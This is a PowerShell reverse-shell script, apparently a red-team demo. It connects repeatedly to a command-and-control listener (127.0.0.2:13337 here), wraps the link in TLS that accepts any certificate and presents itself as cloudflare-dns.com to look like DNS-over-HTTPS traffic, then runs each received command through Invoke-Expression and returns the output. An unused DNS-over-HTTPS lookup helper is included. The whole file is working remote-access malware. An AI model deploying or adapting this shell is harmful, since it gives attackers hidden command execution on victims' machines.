# Make DNS over HTTP lookup for specified record type
function DNSLookup ($DNSRecord) {
    return (([text.encoding]::UTF8).GetString((Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.example.com&type=' + $DNSRecord) -Headers @{'accept'='application/dns-json'}).Content) | ConvertFrom-Json).Answer.data.Trim('"')
}

do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.2', 13337)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()

$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))

$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false)

if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
    $SslStream.Close()
    exit
}

$StreamWriter = New-Object IO.StreamWriter($SslStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()
